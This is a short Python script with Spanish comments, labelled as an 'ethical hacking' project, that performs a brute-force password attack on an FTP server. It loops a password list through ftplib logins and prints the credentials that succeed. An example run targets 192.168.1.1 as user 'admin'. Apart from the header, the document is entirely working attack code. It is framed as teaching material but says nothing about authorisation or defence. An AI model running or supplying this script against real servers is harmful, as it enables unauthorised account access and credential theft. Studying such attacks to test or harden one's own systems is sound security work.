'''
PROYECTOS DE HACKING ETICO WITH PYTHON
ATAQUE DE FUERZA BRUTA A FTP
'''

# Este proyecto muestra cómo realizar un ataque de fuerza bruta a un servidor FTP utilizando Python.

# Utiliza ftplib para interactuar con el servidor FTP y realizar el ataque.
# Se explica cómo manejar excepciones y optimizar la ejecución del script.

import ftplib

# Función de fuerza bruta
def brute_force_ftp(hostname, username, password_list):
    for password in password_list:
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user=username, passwd=password)
            print(f"Login exitoso con {username}:{password}")
            ftp.quit()
            return True
        except ftplib.error_perm:
            print(f"Login fallido para {username}:{password}")
    return False

# Ejemplo de uso
hostname = '192.168.1.1'
username = 'admin'
password_list = ['1234', 'admin', 'password']
brute_force_ftp(hostname, username, password_list)